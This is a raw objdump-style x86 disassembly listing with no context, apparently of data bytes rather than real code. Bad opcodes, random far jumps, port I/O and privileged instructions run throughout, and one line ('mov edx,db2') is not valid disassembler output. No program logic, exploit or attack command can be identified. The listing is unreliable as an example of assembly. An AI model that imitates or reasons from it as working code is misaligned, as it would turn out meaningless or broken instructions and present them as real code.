  41e648:	push   esi
  41e649:	cmp    ebx,edx
  41e64b:	gs repnz popa 
  41e64e:	ins    BYTE PTR es:[edi],dx
  41e64f:	xchg   ebp,eax
  41e650:	stc    
  41e651:	nop
  41e652:	xor    al,0xe6
  41e654:	das    
  41e655:	fidivr WORD PTR gs:[ebx-0x7b73f77c]
  41e65c:	push   esp
  41e65d:	jg     0x41e615
  41e65f:	in     al,dx
  41e660:	int3   
  41e661:	clc    
  41e662:	shl    BYTE PTR [ebx-0x2c],1
  41e665:	rcl    al,0x41
  41e668:	adc    bh,BYTE PTR [edi+0x34]
  41e66b:	addr16 dec ebx
  41e66d:	scas   eax,DWORD PTR es:[edi]
  41e66e:	test   al,al
  41e670:	push   0x48fe6e05
  41e675:	add    eax,0xd4474beb
  41e67a:	mov    ecx,0xa69dd654
  41e67f:	in     al,dx
  41e680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e681:	and    BYTE PTR [ecx],dl
  41e683:	aas    
  41e684:	pusha  
  41e685:	(bad)
  41e688:	repz mov eax,ds:0xb2242ce6
  41e68e:	xchg   ebx,eax
  41e68f:	or     dl,BYTE PTR [ebp+0x12e1e720]
  41e695:	iret   
  41e696:	leave  
  41e697:	rol    BYTE PTR [eax],cl
  41e699:	jge    0x41e632
  41e69b:	retf   0x4300
  41e69e:	jl     0x41e70d
  41e6a0:	mov    cl,0x46
  41e6a2:	mov    ebx,0x59b19d1b
  41e6a7:	(bad)  [edi-0x7ad5f520]
  41e6ad:	outs   dx,DWORD PTR ds:[esi]
  41e6ae:	inc    esi
  41e6af:	and    si,WORD PTR [ebx]
  41e6b2:	jb     0x41e6ca
  41e6b4:	xor    al,0x25
  41e6b6:	pop    edx
  41e6b7:	jmp    0x41e6b2
  41e6b9:	imul   edi,ecx,0xa252be9
  41e6bf:	jae    0x41e70f
	...
  41e731:	add    BYTE PTR [eax],al
  41e733:	add    BYTE PTR [esi+ecx*8],ah
  41e736:	outs   dx,BYTE PTR ds:[esi]
  41e737:	sub    ch,dh
  41e739:	stos   BYTE PTR es:[edi],al
  41e73a:	fs into 
  41e73c:	cmp    al,0xb2
  41e73e:	xor    ebp,DWORD PTR [ebx-0x2a50a9c3]
  41e744:	sub    al,BYTE PTR [edi+0x1]
  41e747:	add    ch,dh
  41e749:	add    BYTE PTR [eax],al
  41e74b:	add    BYTE PTR [edi+ebp*4+0x33b90140],bh
  41e752:	add    eax,0x102a2ddc
  41e757:	stos   BYTE PTR es:[edi],al
  41e758:	or     bh,BYTE PTR [edi+0x3a]
  41e75b:	and    al,0x65
  41e75d:	or     eax,0x2b579f41
  41e762:	js     0x41e752
  41e764:	inc    esp
  41e765:	outs   dx,DWORD PTR ds:[esi]
  41e766:	data16 cld 
  41e768:	cmp    dl,ch
  41e76a:	in     eax,0x29
  41e76c:	in     eax,0xb9
  41e76e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e76f:	mov    ebx,0xe492fe8b
  41e774:	mov    ebp,0x39833f18
  41e779:	in     al,dx
  41e77a:	pop    ecx
  41e77b:	dec    eax
  41e77c:	ds mov bh,0x78
  41e77f:	or     edi,edx
  41e781:	mov    esi,ss
  41e783:	icebp  
  41e784:	mov    edx,0x327f588a
  41e789:	lds    ebx,FWORD PTR [esi]
  41e78b:	ror    edi,cl
  41e78d:	scas   al,BYTE PTR es:[edi]
  41e78e:	mov    dl,0xd6
  41e790:	push   ds
  41e791:	(bad)  
  41e792:	js     0x41e7fa
  41e794:	xchg   edx,eax
  41e795:	clc    
  41e796:	dec    edi
  41e797:	push   esp
  41e798:	dec    ebp
  41e799:	pusha  
  41e79a:	mov    bl,0x70
  41e79c:	arpl   WORD PTR [edi+0x18],bp
  41e79f:	inc    esi
  41e7a0:	test   bh,bh
  41e7a2:	loop   0x41e757
  41e7a4:	ret    
  41e7a5:	xchg   edx,eax
  41e7a6:	hlt    
  41e7a7:	xlat   BYTE PTR ds:[ebx]
  41e7a8:	ret    0x987b
  41e7ab:	mov    dl,0xba
  41e7ad:	dec    esp
  41e7ae:	xchg   esi,eax
  41e7af:	cmp    BYTE PTR [eax+0x26],ah
  41e7b2:	shl    BYTE PTR [eax-0x4428712e],cl
  41e7b8:	inc    ebp
  41e7b9:	push   0x988d6945
  41e7be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7bf:	jo     0x41e792
  41e7c1:	pop    ss
  41e7c2:	inc    ecx
  41e7c3:	imul   edx,eax,0x32bb6bb2
  41e7c9:	push   ebp
  41e7ca:	dec    DWORD PTR [edi-0x3225f53f]
  41e7d0:	cmp    al,0x9d
  41e7d2:	cli    
  41e7d3:	mov    ebp,0x34421eed
  41e7d8:	sbb    cl,cl
  41e7da:	or     dh,BYTE PTR [esi-0x6d]
  41e7dd:	inc    ebx
  41e7de:	mov    ds:0xe6e8dc01,al
  41e7e3:	xchg   BYTE PTR ds:[eax+0x410cac09],al
  41e7ea:	cs jno 0x41e7a1
  41e7ed:	out    dx,al
  41e7ee:	lods   eax,DWORD PTR ds:[esi]
  41e7ef:	nop
  41e7f0:	inc    eax
  41e7f1:	test   eax,0x3d15d44d
  41e7f6:	bound  edx,QWORD PTR [ebx+0x89c3eca]
  41e7fc:	cmp    DWORD PTR [edi],edx
  41e7fe:	sbb    eax,0x6baf4a94
  41e803:	sub    eax,0x9d30d218
  41e808:	test   DWORD PTR [edx-0x24],ebp
  41e80b:	sbb    DWORD PTR [eax-0x23],edx
  41e80e:	pop    ebp
  41e80f:	aad    0x5b
  41e811:	sub    ch,dl
  41e813:	retf   
  41e814:	add    ah,ah
  41e816:	cmp    edi,DWORD PTR [edx]
  41e818:	pop    edx
  41e819:	(bad)  [ecx+0x2fbee8d5]
  41e81f:	inc    al
  41e821:	and    ch,BYTE PTR [edi]
  41e823:	mov    ecx,0x60f24b0e
  41e828:	dec    edx
  41e829:	xor    eax,0x917777be
  41e82e:	push   0xffffffa8
  41e830:	mov    BYTE PTR [edi-0x374cad98],dh
  41e836:	mov    ch,0x9a
  41e838:	sti    
  41e839:	inc    esp
  41e83a:	and    bh,BYTE PTR [ebx*1+0x4c50a9fe]
	...
  41e8b1:	add    BYTE PTR [eax],al
  41e8b3:	add    ah,al
  41e8b5:	ins    BYTE PTR es:[edi],dx
  41e8b6:	pop    es
  41e8b7:	pushf  
  41e8b8:	scas   eax,DWORD PTR es:[edi]
  41e8b9:	(bad)  
  41e8ba:	fistp  QWORD PTR [esi+eiz*4-0x50]
  41e8be:	loop   0x41e93a
  41e8c0:	cmp    eax,0x1f0de646
  41e8c5:	dec    eax
  41e8c6:	add    DWORD PTR [eax],eax
  41e8c8:	cmc    
  41e8c9:	add    BYTE PTR [eax],al
  41e8cb:	add    BYTE PTR [esi],cl
  41e8cd:	xchg   edi,eax
  41e8cf:	jne    0x41e8f1
  41e8d1:	xchg   DWORD PTR [eax+0x73],esi
  41e8d4:	or     ah,ah
  41e8d6:	std    
  41e8d7:	mov    eax,esi
  41e8d9:	inc    ebx
  41e8da:	pop    ebp
  41e8db:	sbb    dh,BYTE PTR [ebx]
  41e8dd:	std    
  41e8de:	inc    ebx
  41e8df:	jne    0x41e8c1
  41e8e1:	sub    edi,DWORD PTR ds:0x6edf5471
  41e8e7:	stc    
  41e8e8:	cmp    esp,DWORD PTR [ecx]
  41e8ea:	jbe    0x41e964
  41e8ec:	out    0xf2,eax
  41e8ee:	imul   ebp,DWORD PTR [edx-0xc],0xffffffb1
  41e8f2:	retf   0x8774
  41e8f5:	dec    esi
  41e8f6:	dec    eax
  41e8f7:	dec    esi
  41e8f8:	stos   BYTE PTR es:[edi],al
  41e8f9:	xor    ecx,esp
  41e8fb:	leave  
  41e8fc:	mov    cl,0x7c
  41e8fe:	push   eax
  41e8ff:	mov    ch,bh
  41e901:	js     0x41e8c1
  41e903:	push   es
  41e904:	mov    dl,0xb
  41e906:	(bad)  
  41e907:	jne    0x41e8af
  41e909:	jl     0x41e89f
  41e90b:	jne    0x41e8e7
  41e90d:	lods   al,BYTE PTR ds:[esi]
  41e90e:	push   ss
  41e90f:	mov    ch,0x6d
  41e911:	xchg   esp,eax
  41e912:	test   DWORD PTR [eax],esp
  41e914:	lods   eax,DWORD PTR ds:[esi]
  41e915:	add    eax,0x8d38aed
  41e91a:	xchg   DWORD PTR [edi+ebx*1],esi
  41e91d:	or     al,0xd6
  41e91f:	jno    0x41e98e
  41e921:	xchg   esp,eax
  41e922:	cmp    eax,0x9a0ebf4f
  41e927:	cmp    eax,0x9372157b
  41e92c:	aad    0xb3
  41e92e:	in     al,0x84
  41e930:	mov    eax,ds:0x81f3cd31
  41e935:	sbb    BYTE PTR [edx],0xf8
  41e938:	pop    esp
  41e939:	fwait
  41e93a:	(bad)  
  41e93b:	loopne 0x41e92b
  41e93d:	jg     0x41e94f
  41e93f:	cmp    eax,0x663c6e4d
  41e944:	ins    DWORD PTR es:[edi],dx
  41e945:	mov    bl,0xd8
  41e947:	cmp    al,0x81
  41e949:	lds    esi,FWORD PTR [edx+ebp*8]
  41e94c:	daa    
  41e94d:	ins    DWORD PTR es:[edi],dx
  41e94e:	imul   edi,DWORD PTR [ebx+0x40875cb2],0x67
  41e955:	dec    esi
  41e956:	inc    ax
  41e958:	sbb    eax,0x55e89e3f
  41e95d:	das    
  41e95e:	out    dx,al
  41e95f:	div    BYTE PTR [ecx-0x1c6dffe9]
  41e965:	data16 in al,dx
  41e967:	sbb    DWORD PTR [edx-0x5b],ecx
  41e96a:	or     al,0x5a
  41e96c:	push   ecx
  41e96d:	gs mov ecx,0x4e8601dc
  41e973:	dec    esp
  41e974:	dec    ebp
  41e975:	das    
  41e976:	mov    al,ds:0xfdb7c490
  41e97b:	repz xor al,0x72
  41e97e:	adc    ch,ch
  41e980:	rcr    DWORD PTR [esi+ebx*4-0x64],1
  41e984:	les    esp,FWORD PTR ds:0x552584fa
  41e98a:	fwait
  41e98b:	cdq    
  41e98c:	jne    0x41e91f
  41e98e:	(bad)  
  41e990:	and    al,0xf5
  41e992:	mov    eax,fs
  41e994:	sub    eax,0x17d3d182
  41e999:	popf   
  41e99a:	mov    dl,0x6c
  41e99c:	xor    eax,0x2b
  41e99f:	pop    ss
  41e9a0:	loopne 0x41e938
  41e9a2:	lods   eax,DWORD PTR ds:[esi]
  41e9a3:	mov    ecx,0x3752fc86
  41e9a8:	hlt    
  41e9a9:	push   ebp
  41e9aa:	dec    esi
  41e9ab:	add    eax,0x879ea4c5
  41e9b0:	outs   dx,DWORD PTR ds:[esi]
  41e9b1:	adc    al,0xdb
  41e9b3:	fisub  DWORD PTR [ebp-0x26]
  41e9b6:	test   DWORD PTR [ecx+ebp*8],0xe2192dcb
  41e9bd:	(bad)  
  41e9bf:	push   ebp
  41e9c0:	xor    DWORD PTR [eax],eax
	...
  41ea32:	add    BYTE PTR [eax],al
  41ea34:	sbb    al,0x15
  41ea36:	jnp    0x41ea8b
  41ea38:	jnp    0x41eab9
  41ea3a:	cmp    al,0x5f
  41ea3c:	les    ecx,FWORD PTR [ebx+0x21]
  41ea3f:	frstor [edx+0x148be1b9]
  41ea45:	dec    ecx
  41ea46:	add    DWORD PTR [eax],eax
  41ea48:	cmc    
  41ea49:	add    BYTE PTR [eax],al
  41ea4b:	add    BYTE PTR [esi-0x58],ch
  41ea4e:	hlt    
  41ea4f:	inc    ebx
  41ea50:	fwait
  41ea51:	pop    ss
  41ea52:	cwde   
  41ea53:	push   esi
  41ea54:	adc    ebp,DWORD PTR [esi+0x3c604b10]
  41ea5a:	xor    ecx,DWORD PTR [esi-0x3b]
  41ea5d:	pop    es
  41ea5e:	inc    esi
  41ea5f:	or     DWORD PTR [esi-0x24e974c2],0x1c
  41ea66:	mov    esi,0x500d5141
  41ea6b:	ja     0x41ea67
  41ea6d:	mov    WORD PTR [eax+0x57f1d548],cs
  41ea73:	sub    ah,BYTE PTR [edx-0x28ad281c]
  41ea79:	repnz cmp bl,al
  41ea7c:	int3   
  41ea7d:	push   ecx
  41ea7e:	(bad)  
  41ea7f:	mov    ebp,0x5fdd069e
  41ea84:	xchg   ecx,eax
  41ea85:	pop    edi
  41ea86:	add    al,0xda
  41ea88:	outs   dx,BYTE PTR ds:[esi]
  41ea89:	sahf   
  41ea8a:	out    dx,al
  41ea8b:	fadd   DWORD PTR [edx]
  41ea8d:	scas   al,BYTE PTR es:[edi]
  41ea8e:	mov    esp,0x9a9cedcd
  41ea93:	icebp  
  41ea94:	mov    ecx,0xb82356fb
  41ea99:	and    ecx,DWORD PTR [eax+0x5a069281]
  41ea9f:	add    DWORD PTR [ebp+0x57a2aac6],edx
  41eaa5:	test   DWORD PTR [ecx],edx
  41eaa7:	bound  ecx,QWORD PTR [esi-0x1a9d656a]
  41eaad:	sbb    bh,ah
  41eaaf:	xor    esi,ebp
  41eab1:	out    0x2c,eax
  41eab3:	fwait
  41eab4:	aam    0x72
  41eab6:	imul   edi,esp,0xffffff96
  41eab9:	call   0x9cf5:0xf5803e66
  41eac0:	lock clc 
  41eac2:	ins    BYTE PTR es:[edi],dx
  41eac3:	bound  ebp,QWORD PTR [ebx-0x58]
  41eac6:	dec    esi
  41eac7:	ss pop ebx
  41eac9:	push   edi
  41eaca:	out    dx,al
  41eacb:	ret    0x74f1
  41eace:	in     al,0xb4
  41ead0:	out    dx,al
  41ead1:	in     eax,dx
  41ead2:	loopne 0x41ea56
  41ead4:	xchg   ebx,eax
  41ead5:	xor    dl,bl
  41ead7:	sahf   
  41ead8:	pop    ebx
  41ead9:	out    dx,eax
  41eada:	cmc    
  41eadb:	inc    edx
  41eadc:	lahf   
  41eadd:	pop    ss
  41eade:	rcr    BYTE PTR [esi],1
  41eae0:	mov    esp,0x1a34794f
  41eae5:	inc    ecx
  41eae6:	fucomi st,st(7)
  41eae8:	adc    ecx,0x7689be9c
  41eaee:	in     eax,dx
  41eaef:	xchg   ebp,eax
  41eaf0:	and    eax,0x6b1ffef0
  41eaf5:	sti    
  41eaf6:	js     0x41ea7e
  41eaf8:	sbb    DWORD PTR [edi-0x67],0xe461635d
  41eaff:	jns    0x41eaa9
  41eb01:	repnz or DWORD PTR [edi],esp
  41eb04:	xchg   edi,eax
  41eb05:	inc    eax
  41eb06:	mov    eax,ds:0x3dd83d54
  41eb0b:	test   al,0x2b
  41eb0d:	sub    al,0x54
  41eb0f:	sbb    DWORD PTR [edi],0xf54b0905
  41eb15:	adc    bh,bl
  41eb17:	popf   
  41eb18:	pop    eax
  41eb19:	push   edi
  41eb1a:	fistp  QWORD PTR [eax+0x4f]
  41eb1d:	pushf  
  41eb1e:	loope  0x41eaa7
  41eb20:	(bad)  
  41eb21:	pop    ebx
  41eb22:	lods   al,BYTE PTR ds:[esi]
  41eb23:	jmp    0x5bf4cb04
  41eb28:	jno    0x41eb36
  41eb2a:	cwde   
  41eb2b:	into   
  41eb2c:	sub    al,0x27
  41eb2e:	jnp    0x41eac3
  41eb30:	cmc    
  41eb31:	(bad)  
  41eb32:	das    
  41eb33:	cli    
  41eb34:	sbb    eax,DWORD PTR [edi-0x1130cca0]
  41eb3a:	jmp    0xb7f1:0x66543ab3
	...
  41ebb1:	add    BYTE PTR [eax],al
  41ebb3:	add    BYTE PTR [edi-0x36],ch
  41ebb6:	adc    eax,0xefdfb598
  41ebbb:	inc    DWORD PTR [ebx+0x1e]
  41ebbe:	arpl   sp,si
  41ebc0:	xchg   cl,dh
  41ebc2:	adc    ecx,DWORD PTR ss:[ecx]
  41ebc5:	dec    edx
  41ebc6:	add    DWORD PTR [eax],eax
  41ebc8:	cmc    
  41ebc9:	add    BYTE PTR [eax],al
  41ebcb:	add    BYTE PTR [eax+0x2fd41004],dh
  41ebd1:	scas   al,BYTE PTR es:[edi]
  41ebd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebd3:	ret    0x4905
  41ebd6:	lds    esi,FWORD PTR [edx]
  41ebd8:	cmp    DWORD PTR [edx+0x4d],0x3
  41ebdc:	loop   0x41eb6a
  41ebde:	lahf   
  41ebdf:	lods   eax,DWORD PTR ds:[esi]
  41ebe0:	push   0xa5978030
  41ebe5:	fmul   QWORD PTR [eax+0x5c]
  41ebe8:	dec    ebp
  41ebe9:	xchg   bl,dl
  41ebeb:	arpl   dx,bp
  41ebed:	add    dh,ch
  41ebef:	enter  0xcc2e,0xf3
  41ebf3:	adc    DWORD PTR [edx+0x56f5ec17],eax
  41ebf9:	mov    ebp,0xc0035b0f
  41ebfe:	ins    DWORD PTR es:[edi],dx
  41ebff:	mov    bh,0x52
  41ec01:	xor    ecx,DWORD PTR [edx+0x6e]
  41ec04:	add    DWORD PTR [edx],esp
  41ec06:	enter  0x4eda,0xb0
  41ec0a:	in     al,0x6
  41ec0c:	dec    DWORD PTR [edx-0x43c28e21]
  41ec12:	xchg   ebp,eax
  41ec13:	adc    dh,ch
  41ec15:	aaa    
  41ec16:	jp     0x41ebeb
  41ec18:	cld    
  41ec19:	inc    eax
  41ec1a:	jmp    0x97f837f0
  41ec1f:	cld    
  41ec20:	cli    
  41ec21:	lock and ah,BYTE PTR [esi-0x26]
  41ec25:	out    0x99,eax
  41ec27:	fld    QWORD PTR [ecx+0x41]
  41ec2a:	add    bh,dh
  41ec2c:	stos   DWORD PTR es:[edi],eax
  41ec2d:	jb     0x41ebbf
  41ec2f:	dec    esp
  41ec30:	lock sbb eax,0xdb59b65c
  41ec36:	push   ebx
  41ec37:	out    dx,al
  41ec38:	call   0xeb1d:0xa4566f6c
  41ec3f:	icebp  
  41ec40:	imul   edx,DWORD PTR [esi+0x3a],0x694c4158
  41ec47:	dec    ecx
  41ec48:	sub    bl,ah
  41ec4a:	sbb    eax,0x6f99ebe2
  41ec4f:	lock es pusha 
  41ec52:	and    DWORD PTR ss:[ebp-0x6b0ebecc],0x7b
  41ec5a:	push   edi
  41ec5b:	jmp    FWORD PTR [eax-0x7e]
  41ec5e:	push   edx
  41ec5f:	inc    edx
  41ec60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec61:	retf   0x3d96
  41ec64:	inc    edx
  41ec65:	in     al,dx
  41ec66:	xor    BYTE PTR [eax],ah
  41ec68:	xchg   esp,eax
  41ec69:	pusha  
  41ec6a:	test   BYTE PTR [eax],0x78
  41ec6d:	fist   WORD PTR [edx]
  41ec6f:	inc    edx
  41ec70:	jae    0x41ecc9
  41ec72:	loope  0x41ec2d
  41ec74:	shl    DWORD PTR [ecx-0x3e1c7250],cl
  41ec7a:	and    DWORD PTR [edi+ecx*1+0x6e],eax
  41ec7e:	int    0x34
  41ec80:	in     eax,dx
  41ec81:	fiadd  WORD PTR [edi]
  41ec83:	mov    edi,0x9477bd1c
  41ec88:	hlt    
  41ec89:	into   
  41ec8a:	pop    es
  41ec8b:	test   eax,0xcd57333e
  41ec90:	adc    bh,BYTE PTR [ebx]
  41ec92:	xchg   BYTE PTR [ebx+0x13],dh
  41ec95:	add    eax,0x6b897b1a
  41ec9a:	pusha  
  41ec9b:	test   eax,0xca08ba4d
  41eca0:	in     al,0xca
  41eca2:	dec    esp
  41eca3:	inc    esi
  41eca4:	jb     0x41eca0
  41eca6:	call   0x98f4:0x380261c1
  41ecad:	mov    edx,0x541b3b51
  41ecb2:	call   0xefa2:0x37db54b1
  41ecb9:	push   esp
  41ecba:	sti    
  41ecbb:	shl    DWORD PTR [ebx],0x3
  41ecbe:	xor    ah,BYTE PTR [ebx-0x55]
	...
  41ed31:	add    BYTE PTR [eax],al
  41ed33:	add    BYTE PTR [eax],ah
  41ed35:	repz das 
  41ed37:	cmp    bh,0xde
  41ed3a:	lods   eax,DWORD PTR ds:[esi]
  41ed3b:	repz xlat BYTE PTR ds:[ebx]
  41ed3d:	in     al,dx
  41ed3e:	pusha  
  41ed3f:	out    dx,al
  41ed40:	xchg   edx,eax
  41ed41:	ffreep st(5)
  41ed43:	cmp    dh,0x4a
  41ed46:	add    DWORD PTR [eax],eax
  41ed48:	cmc    
  41ed49:	add    BYTE PTR [eax],al
  41ed4b:	add    BYTE PTR [edx-0x67076e8b],dl
  41ed51:	(bad)  
  41ed52:	out    0x98,al
  41ed54:	bound  ecx,QWORD PTR [edi]
  41ed56:	cmp    al,0x9a
  41ed58:	and    BYTE PTR [ebx],ah
  41ed5a:	xor    DWORD PTR [edi],esp
  41ed5c:	dec    eax
  41ed5d:	and    al,0x5e
  41ed5f:	dec    ecx
  41ed60:	push   0x29ca32b5
  41ed65:	sbb    esp,DWORD PTR [esi-0x55]
  41ed68:	dec    eax
  41ed69:	jmp    0x12b6:0x35f9e7ee
  41ed70:	hlt    
  41ed71:	mov    ch,0xe6
  41ed73:	(bad)  
  41ed74:	sub    ebp,ebx
  41ed76:	loopne 0x41ede8
  41ed78:	cmp    cl,BYTE PTR [esi+0x5c907517]
  41ed7e:	jbe    0x41ed9b
  41ed80:	pop    ds
  41ed81:	and    ebp,edx
  41ed83:	sbb    BYTE PTR [edi-0x55],ch
  41ed86:	dec    ebp
  41ed87:	pop    ecx
  41ed88:	into   
  41ed89:	xchg   ecx,eax
  41ed8a:	fwait
  41ed8b:	test   eax,0x8093bd65
  41ed90:	cli    
  41ed91:	pop    ecx
  41ed92:	cld    
  41ed93:	lds    esi,FWORD PTR [esi+0x4c7e322d]
  41ed99:	mov    ds:0x94f02cd,eax
  41ed9e:	jp     0x41eda6
  41eda0:	mov    esi,0x56eb3260
  41eda5:	push   esi
  41eda6:	sub    BYTE PTR [ebx-0xc],0x5e
  41edaa:	in     eax,0xf2
  41edac:	jp     0x41ed87
  41edae:	(bad)  
  41edb0:	loop   0x41edc0
  41edb2:	ja     0x41ee10
  41edb4:	mov    al,0x11
  41edb6:	cmp    DWORD PTR [ebp-0x3c979780],esp
  41edbc:	xchg   edx,eax
  41edbd:	out    dx,al
  41edbe:	push   ebx
  41edbf:	fistp  QWORD PTR [edi-0x3f2ff83]
  41edc5:	cmp    al,0x6d
  41edc7:	(bad)  
  41edc8:	jecxz  0x41ed7b
  41edca:	mov    dl,0xc2
  41edcc:	push   edi
  41edcd:	rol    esi,0x56
  41edd0:	xor    ebx,ebp
  41edd2:	lock mov ah,BYTE PTR [ecx-0x5e]
  41edd6:	push   edi
  41edd7:	fld    DWORD PTR ds:0xe9a5b2ca
  41eddd:	or     eax,0x305c8e7d
  41ede2:	jmp    0x4979:0x112ec3f8
  41ede9:	ds mov ch,0xb2
  41edec:	fnstenv [ecx*2-0xe80bef4]
  41edf3:	mov    ah,dh
  41edf5:	sbb    bh,BYTE PTR ds:0xd06bc54c
  41edfb:	inc    eax
  41edfc:	std    
  41edfd:	rcl    esp,cl
  41edff:	in     al,dx
  41ee00:	test   esi,esp
  41ee02:	sub    BYTE PTR ds:0x31c2d0a,ch
  41ee08:	mov    esi,0xe46c19d1
  41ee0d:	xchg   ebx,eax
  41ee0e:	xlat   BYTE PTR ds:[ebx]
  41ee0f:	xchg   ecx,eax
  41ee10:	adc    bl,BYTE PTR [ebx+0x34]
  41ee13:	add    dh,BYTE PTR [esp+ecx*8+0x6c]
  41ee17:	jne    0x41eda1
  41ee19:	sbb    ah,BYTE PTR [ebx-0x7]
  41ee1c:	dec    ecx
  41ee1d:	push   cs
  41ee1e:	or     eax,0xe29b7a2a
  41ee23:	lods   eax,DWORD PTR ds:[esi]
  41ee24:	push   ebp
  41ee25:	dec    esp
  41ee26:	adc    ecx,eax
  41ee28:	sbb    DWORD PTR [ebx+ebx*4-0x6d],0x1a
  41ee2d:	xchg   DWORD PTR [ecx-0x6a],ebx
  41ee30:	cmp    eax,0x4db250f1
  41ee35:	xor    al,0xbe
  41ee37:	ror    BYTE PTR [ebx+0x6bfce9e9],1
  41ee3d:	js     0x41ee60
  41ee3f:	imul   edi,ecx,0x0
	...
  41eeb1:	add    BYTE PTR [eax],al
  41eeb3:	add    BYTE PTR [edi],bh
  41eeb5:	daa    
  41eeb6:	push   ss
  41eeb7:	cld    
  41eeb8:	push   ds
  41eeb9:	std    
  41eeba:	jmp    edi
  41eebc:	push   eax
  41eebd:	jg     0x41eee4
  41eebf:	push   esp
  41eec0:	xchg   esp,eax
  41eec1:	dec    eax
  41eec2:	cwde   
  41eec3:	add    dh,bl
  41eec5:	dec    ebx
  41eec6:	add    DWORD PTR [eax],eax
  41eec8:	cmc    
  41eec9:	add    BYTE PTR [eax],al
  41eecb:	add    BYTE PTR [ecx+0x27],dl
  41eece:	fisttp QWORD PTR [ecx+edx*2]
  41eed1:	xchg   esi,eax
  41eed2:	stos   DWORD PTR es:[edi],eax
  41eed3:	loop   0x41ef4b
  41eed5:	mov    bl,0x4
  41eed7:	mov    edx,DWORD PTR [edx]
  41eed9:	loopne 0x41ee99
  41eedb:	lea    edi,[ebx]
  41eedd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eede:	add    al,0x31
  41eee0:	sti    
  41eee1:	inc    edx
  41eee2:	sbb    DWORD PTR [eax+0x5124f217],ebp
  41eee8:	rol    DWORD PTR [ecx-0x5e5aa23f],1
  41eeee:	nop
  41eeef:	jmp    0xb37b:0xfd0bebe6
  41eef6:	push   bp
  41eef8:	push   ds
  41eef9:	loope  0x41ef18
  41eefb:	push   ecx
  41eefc:	jmp    0x41ef18
  41eefe:	mov    WORD PTR [ebx+0x11c29f28],es
  41ef04:	jbe    0x41ef0e
  41ef06:	adc    DWORD PTR [edx+0x61],ebx
  41ef09:	scas   al,BYTE PTR es:[edi]
  41ef0a:	xchg   ebx,eax
  41ef0b:	call   0x17f9:0x27bdd1b7
  41ef12:	xor    eax,0x3e522ae1
  41ef17:	repnz in al,0x92
  41ef1a:	pop    ds
  41ef1b:	mov    ah,0x93
  41ef1d:	rol    bh,1
  41ef1f:	jp     0x41ef20
  41ef21:	je     0x41ef05
  41ef23:	push   0x2f67f68f
  41ef28:	dec    ebp
  41ef29:	neg    DWORD PTR [esi]
  41ef2b:	test   al,0xd7
  41ef2d:	repz jb 0x41ef63
  41ef30:	popf   
  41ef31:	xor    BYTE PTR [eax],dh
  41ef33:	jp     0x41ef5b
  41ef35:	and    BYTE PTR [eax-0x2d0e8841],ah
  41ef3b:	cmp    ecx,esi
  41ef3d:	mov    bl,BYTE PTR ds:0x5dd05865
  41ef43:	dec    esi
  41ef44:	nop
  41ef45:	aaa    
  41ef46:	into   
  41ef47:	imul   ebp,DWORD PTR [esi-0x1],0xc616c66c
  41ef4e:	pusha  
  41ef4f:	dec    esp
  41ef50:	jo     0x41ef2b
  41ef52:	out    0x29,al
  41ef54:	int3   
  41ef55:	fldcw  WORD PTR [ecx-0x62]
  41ef58:	push   ebp
  41ef59:	int    0x0
  41ef5b:	scas   eax,DWORD PTR es:[edi]
  41ef5c:	fwait
  41ef5d:	pop    edi
  41ef5e:	mov    bl,0x78
  41ef60:	push   esi
  41ef61:	jnp    0x41eee5
  41ef63:	dec    edx
  41ef64:	and    ebp,edx
  41ef66:	jne    0x41ef9a
  41ef68:	pop    ds
  41ef69:	or     eax,0x81e92990
  41ef6e:	pushf  
  41ef6f:	mov    ds:0x25729f6,eax
  41ef74:	mov    edx,db2
  41ef77:	add    DWORD PTR [edi],0x48b13644
  41ef7d:	pop    es
  41ef7e:	cdq    
  41ef7f:	inc    esi
  41ef80:	xchg   ebx,eax
  41ef81:	daa    
  41ef82:	out    0xae,al
  41ef84:	mov    ds:0x45912411,al
  41ef89:	ror    DWORD PTR [edx+0x58ace88e],cl
  41ef8f:	adc    al,0x15
  41ef91:	cld    
  41ef92:	and    al,0xb7
  41ef94:	adc    DWORD PTR [ecx+0x11],eax
  41ef97:	push   ss
  41ef98:	and    edi,DWORD PTR [ebx+0x186fbbd8]
  41ef9e:	outs   dx,BYTE PTR ds:[esi]
  41ef9f:	push   ebx
  41efa0:	sub    DWORD PTR [ebp+0x74],esp
  41efa3:	push   es
  41efa4:	xchg   DWORD PTR [esi+eiz*8+0x7df2cfc2],ebx
  41efab:	imul   esi,DWORD PTR [edx-0x61],0x8769a39
  41efb2:	jo     0x41f011
  41efb4:	mov    bh,0x9f
  41efb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efb7:	pop    edi
  41efb8:	enter  0x7d69,0x52
  41efbc:	or     ch,dl
  41efbe:	and    al,0x62
  41efc0:	leave  
	...
  41f031:	add    BYTE PTR [eax],al
  41f033:	add    BYTE PTR [edi+0x53],cl
  41f036:	add    al,0xc
  41f038:	sbb    al,0x5f
  41f03a:	dec    edi
  41f03b:	push   ebx
  41f03c:	cwde   
  41f03d:	adc    edi,DWORD PTR [ebp+ecx*4+0x17]
  41f041:	pop    ebp
  41f042:	xor    BYTE PTR [eax+ebp*8+0x4c],0x1
  41f047:	add    ch,dh
  41f049:	add    BYTE PTR [eax],al
  41f04b:	add    BYTE PTR [edi+0x58],al
  41f04e:	and    ch,bh
  41f050:	in     al,0xb0
  41f052:	ret    0xd858
  41f055:	test   eax,0xf09db1ed
  41f05a:	push   eax
  41f05b:	jmp    0xb5893579
  41f060:	pop    es
  41f061:	and    cl,BYTE PTR [edi+0x39191575]
  41f067:	ret    0x33ca
  41f06a:	adc    bl,cl
  41f06c:	push   ebx
  41f06d:	es mov esi,0x8f0cfcc7
  41f073:	push   ebx
  41f074:	xor    al,0xf7
  41f076:	mov    bh,BYTE PTR [esi+edi*1+0x4a]
  41f07a:	jns    0x41f07a
  41f07c:	add    esi,DWORD PTR [ecx+edi*4]
  41f07f:	outs   dx,BYTE PTR ds:[esi]
  41f080:	xchg   ebp,eax
  41f081:	in     eax,dx
  41f082:	sbb    ch,BYTE PTR [edx-0x36a789b6]
  41f088:	sub    BYTE PTR [ebx],dl
  41f08a:	pop    ebp
  41f08b:	xor    bl,ah
  41f08d:	enter  0x3eda,0x1d
